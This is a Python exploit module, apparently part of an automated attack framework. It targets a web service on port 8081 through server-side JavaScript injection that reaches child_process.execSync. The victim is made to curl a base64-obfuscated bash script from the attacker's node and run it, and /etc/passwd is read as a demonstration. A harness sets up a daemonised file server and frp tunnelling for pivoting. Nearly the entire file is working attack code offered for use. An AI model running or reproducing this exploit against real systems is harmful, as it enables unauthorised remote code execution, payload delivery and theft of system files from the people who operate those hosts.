import base64
import os
import sys
import tempfile
import time
from typing import TYPE_CHECKING
from urllib.parse import quote

import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


def random_str():
    return next(tempfile._get_candidate_names())


class MongoExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}:8081"
        self.is_rce = True
        self.is_endpoint = False

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        pass

    def exploit_rce(
        self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd
    ) -> str:
        encoded_cmd = self.encode_cmd(cmd)

        malicious_shell = random_str()
        with open(f"/tmp/{malicious_shell}", "w") as f:
            f.write(encoded_cmd)

        headers = {
            "User-Agent": "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Authorization": "Basic YWRtaW46cGFzcw==",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        payload = f"""document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl -o /tmp/{malicious_shell} http://{proxier.init_node_ip}:{proxier.init_node_port}/{malicious_shell}")"""

        proxier.send_request(
            "post",
            f"{self.prefix}/checkValid",
            headers=headers,
            data=payload,
        )

        payload = f"""document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("/bin/bash /tmp/{malicious_shell}")"""

        res = proxier.send_request(
            "post",
            f"{self.prefix}/checkValid",
            headers=headers,
            data=payload,
        )

        return res.text

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        cmd = "cat /etc/passwd"
        res = self.exploit_rce(proxier, cmd)
        print(res)


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.ip = "192.168.123.110"
            self.session = requests.Session()
            self.web_server_port = 20001
            self.build_web_server()

        def build_web_server(self):
            self.upload_file("./frp.tar.gz", "frp.tar.gz")
            self.upload_file("./httpd", "httpd")
            self.execute_rce("tar -xzvf /tmp/frp.tar.gz -C /tmp/")
            self.execute_rce(f"chmod +x /tmp/httpd")
            self.execute_rce(
                f"/tmp/httpd /tmp --port {self.web_server_port} --daemon",
            )

        def execute_rce(self, cmd: str):
            os.system(cmd)

        def upload_file(self, attack_file_path: str, file_name: str):
            self.execute_rce(f"cp -f {attack_file_path} /tmp/{file_name}")

        def map_to_attacker(self, port: int):
            # do nothing
            pass

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

    local_node_fake = LocalNodeFake()
    exploiter = MongoExploiter("192.168.123.32")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_rce(local_node_fake, "touch /tmp/success")
    exploiter.exploit_no_rce(local_node_fake)
